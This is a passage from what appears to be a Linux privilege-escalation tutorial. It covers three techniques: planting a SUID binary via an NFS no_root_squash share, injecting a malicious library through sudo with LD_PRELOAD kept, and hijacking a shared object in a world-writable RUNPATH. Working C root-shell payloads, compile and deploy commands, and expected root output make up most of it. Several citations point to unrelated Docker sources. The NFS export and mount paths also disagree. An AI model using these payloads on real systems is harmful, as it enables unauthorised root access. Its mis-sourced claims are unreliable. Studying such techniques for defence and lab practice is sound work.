bash-5.3$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/var/nfs/backup *(rw,sync,no_subtree_check,no_root_squash)

```

Either method confirms that `no_root_squash` is active on this share.

**Export options breakdown:**

| Option             | Meaning                                                   |
| ------------------ | --------------------------------------------------------- |
| `rw`               | Read and write access allowed                             |
| `sync`             | Data is written to disk before the server replies         |
| `no_subtree_check` | Disables subtree checking (avoids errors with open files) |
| `no_root_squash`   |  Root on the client keeps root privileges on the server   |

**Mount the Share (Attacker Machine)**

Create a local mount point and mount the target NFS share:
```
sudo mkdir /mnt/nfs
sudo mount -t nfs 192.168.56.20:/var/nfs/general /mnt/nfs
```

Verify the mount:
```
mount | grep nfs
```

<img src="/budahacksecurity/uploads/md_images/privL/privL25.png" style="max-width:100%; border-radius:8px;">



**Create and Deploy the SUID Binary**

**Write the C payload**

On the attacker machine, create the following C source file:
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```
> `#include <sys/types.h>` is required for `setuid()`/`setgid()` type definitions on some distributions.


Compile
```
gcc shell.c -o shell
```

<img src="/budahacksecurity/uploads/md_images/privL/privL26.png" style="max-width:100%; border-radius:8px;">


Copy to the NFS 

```
cp shell /mnt/nfs/
```

Since `no_root_squash` is active, the NFS server accepts these operations from our root client:

```
sudo chown root:root /mnt/nfs/shell
sudo chmod 4755 /mnt/nfs/shell
```

Verify

```
ls -la /mnt/nfs/shell
```

<img src="/budahacksecurity/uploads/md_images/privL/privL27.png" style="max-width:100%; border-radius:8px;">


**Expected output:**

```
-rwsr-xr-x 1 root root 16472 Jun 11 10:00 /mnt/nfs/shell
```

The `s` in `rws` confirms the SUID bit is set.

**Execute from the Victim (Low-Privilege Session)**

From the low-privilege shell already obtained on the victim machine, navigate to the shared directory and execute the binary:

<img src="/budahacksecurity/uploads/md_images/privL/privL28.png" style="max-width:100%; border-radius:8px;">



## Shared Libraries & `LD_PRELOAD`

In Linux systems, many programs use shared libraries (`.so` files — Shared Objects) to access common functions without including all the code inside the executable itself. This allows multiple programs to reuse the same code, reducing executable size and optimizing system memory usage.

**What Is `LD_PRELOAD`?**

`LD_PRELOAD` is an environment variable used by the Linux dynamic linker (`ld.so`) to load a shared library **before** all other standard system libraries — including `libc`. Its primary function is to allow substitution or interception of functions used by an application at runtime.


**`LD_PRELOAD` and Privilege Escalation**

 Prerequisites for This Attack

By default, `sudo` runs programs in a new, minimal environment (`env_reset`). The `env_keep` option can be used to preserve certain environment variables from the user's environment. [GitHub](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md)

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement `env_keep+=LD_PRELOAD`. This configuration allows the `LD_PRELOAD` environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges. [Elastic](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/linux/privilege_escalation_writable_docker_socket)

**Both conditions must be true simultaneously:**

1. `env_keep+=LD_PRELOAD` appears in `sudo -l` output
2. The user can run at least one binary via `sudo`


```
sudo -l 

Matching Defaults entries for vuln on debian:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty,
    env_keep+=LD_PRELOAD

User vuln may run the following commands on debian:
    (root) NOPASSWD: /usr/bin/find
```

- `env_keep+=LD_PRELOAD` — the variable survives the `sudo` environment reset 
- `(root) NOPASSWD: /usr/bin/find` — the user can run `find` as root without a password 
- GTFOBins techniques for `find` are not applicable in this configuration — but `LD_PRELOAD` gives us a direct path to root regardless of which binary is allowed.

**Write the Malicious Shared Library

Create the following C source file. The `_init()` function is automatically called by the dynamic linker the moment the shared library is loaded into memory:**

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

**Code explanation:**

|Line|Purpose|
|---|---|
|`unsetenv("LD_PRELOAD")`|Removes the variable immediately to prevent the library from being loaded again recursively|
|`setgid(0)` / `setuid(0)`|Sets both the real and effective GID/UID to root (0)|
|`system("/bin/bash")`|Spawns an interactive bash shell inheriting the elevated privileges|

**Compile the Shared Object**

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

**Compiler flag breakdown:**

| Flag            | Purpose                                                                                                 |
| --------------- | ------------------------------------------------------------------------------------------------------- |
| `-fPIC`         | Position Independent Code — required for shared libraries; allows the code to run at any memory address |
| `-shared`       | Tells gcc to produce a shared object (`.so`) instead of an executable                                   |
| `-o shell.so`   | Names the output file                                                                                   |
| `-nostartfiles` | Skips linking standard C runtime startup files (not needed since we use `_init()` directly)             |

**Execute the Exploit**

Invoke the allowed sudo binary while injecting our malicious library via `LD_PRELOAD`:
```
sudo LD_PRELOAD=/home/buda/shell.so /usr/bin/find
```

<img src="/budahacksecurity/uploads/md_images/privL/privL29.png" style="max-width:100%; border-radius:8px;">


**What happens at execution:**

1. `sudo` launches `/usr/bin/find` as root
2. Because `env_keep+=LD_PRELOAD`, the variable survives the environment reset
3. The dynamic linker loads `shell.so` **before** any other library
4. `_init()` fires immediately — root UID/GID is set, bash is spawned
5. `find` never actually runs

## Shared Object Hijacking

**What Is Shared Object Hijacking?**

Shared Object Hijacking (also known as Shared Library Hijacking) is a privilege escalation technique that exploits an insecure configuration in how shared libraries (`.so` files) are loaded by Linux applications.

When a program needs an external function, the dynamic loader (`ld.so`) searches for the corresponding library in the paths configured by the system. If an attacker can control any of these locations, they can replace the legitimate library with a malicious one that will be executed with the privileges of the vulnerable program.

This misconfiguration is especially dangerous when it affects binaries with SUID permissions, since the code in the malicious library will execute with the privileges of the binary's owner.

##### Shared Libraries

Shared libraries allow code reuse across multiple applications. The most common locations are:

```
/lib
/usr/lib
/usr/local/lib
```

They use the `.so` extension (Shared Object). Common examples:

```
libc.so.6
libpthread.so.0
libssl.so
```

##### Library Search Order

The dynamic linker searches for libraries in the following order: the value of `DT_RUNPATH` or `DT_RPATH` (set with the `-rpath` compiler option), the default system library directories `/lib` and `/usr/lib`, and directories specified in `/etc/ld.so.conf`. [GitHub](https://github.com/b4rdia/HackTricks/blob/master/linux-hardening/privilege-escalation/docker-breakout/abusing-docker-socket-for-privilege-escalation.md)

**RUNPATH** defines additional directories where the dynamic linker will search for shared libraries. If this directory is writable by unprivileged users, it becomes an escalation vector.

Inspect RUNPATH with:

```bash
readelf -d binary | grep PATH
```

Example output:

```
0x000000000000001d (RUNPATH)    Library runpath: [/opt/inventory]
```


##### Enumeration

**Find SUID Binaries**

```bash
find / -perm -4000 -type f 2>/dev/null
```

An unusual binary is found:

```
/usr/local/bin/inventory
```

**Analyze Dependencies with `ldd`**

```bash
ldd /usr/local/bin/inventory
```

```
linux-vdso.so.1 (0x00007f3b8b8c0000)
libinventory.so => /opt/inventory/libinventory.so (0x00007f3b8b8ae000)
libc.so.6 => /usr/lib/x86_64-linux-gnu/libc.so.6 (0x00007f3b8b6a2000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3b8b8c2000)
```

`libinventory.so` is a non-standard library loaded from a custom path — this is suspicious.

#### Check RUNPATH

```bash
readelf -d /usr/local/bin/inventory | grep PATH
```

```
0x000000000000001d (RUNPATH)    Library runpath: [/opt/inventory]
```

#### Verify Directory Permissions

```bash
ls -ld /opt/inventory
```

```
drwxrwxrwx 2 root root 4096 Jun  9 08:51 /opt/inventory
```

World-writable (`rwxrwxrwx`) — any user can write files here. The attack vector is confirmed.

##### Identify the Target Function

We need to know the exact function name exported by `libinventory.so` so our malicious library can replace it. Three methods:

**Method A — `strings`**

```bash
strings /usr/local/bin/inventory
```

Scanning the output reveals a function name: `getInventory`

**Method B — `nm` (if the original library is accessible)**

```bash
nm -D /opt/inventory/libinventory.so
```

```
                 w __cxa_finalize@GLIBC_2.2.5
0000000000001109 T getInventory
                 w __gmon_start__
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
                 U puts@GLIBC_2.2.5
```

The flag `T` means the symbol is defined and exported from the `.text` (code) section of the library — confirming `getInventory` is the function we need to implement.

**Method C — Symbol Error Trick (most reliable)**

Temporarily replace the library with one that exists but does not contain the required function, forcing the binary to reveal the missing symbol name:


```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /opt/inventory/libinventory.so
/usr/local/bin/inventory
```

```
/usr/local/bin/inventory: symbol lookup error: /usr/local/bin/inventory: undefined symbol: getInventory
```

The error directly reveals the function name: `getInventory`.

**Method D — `strace` (alternative)**

```bash
strace /usr/local/bin/inventory 2>&1 | grep -iE "open|access|no such file"
```

`strace` displays all system calls the binary makes, including file operations, allowing identification of which shared objects it attempts to load and from which paths. [GitHub](https://github.com/ivanversluis/pentest-hacktricks/blob/master/linux-unix/privilege-escalation/docker-breakout.md)

##### Create the Malicious Library

Once we know the target function, we write a C file implementing it with our malicious payload:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void getInventory() {
    printf("Malicious library loaded\n");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

**Code explanation:**

|Line|Purpose|
|---|---|
|`void getInventory()`|Must match the exact exported function name — otherwise the binary rejects the library|
|`setgid(0)` / `setuid(0)`|Sets both GID and UID to root (0)|
|`system("/bin/bash -p")`|Spawns bash with `-p` flag, which preserves the effective UID set by SUID|


##### Compile and Deploy

Compile the malicious library directly into the RUNPATH directory:

```bash
gcc mal.c -fPIC -shared -o /opt/inventory/libinventory.so
```

**Compiler flag breakdown:**

|Flag|Purpose|
|---|---|
|`-fPIC`|Position Independent Code — required for shared libraries to run at any memory address|
|`-shared`|Produces a shared object (`.so`) instead of an executable|
|`-o /opt/inventory/libinventory.so`|Writes directly to the RUNPATH directory, overwriting the original|

##### Execute and Verify


```bash
/usr/local/bin/inventory
```

**Expected output:**

```
Malicious library loaded
```

Immediately followed by a root shell. Verify:

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

<img src="/budahacksecurity/uploads/md_images/privL/privL30.png" style="max-width:100%; border-radius:8px;">

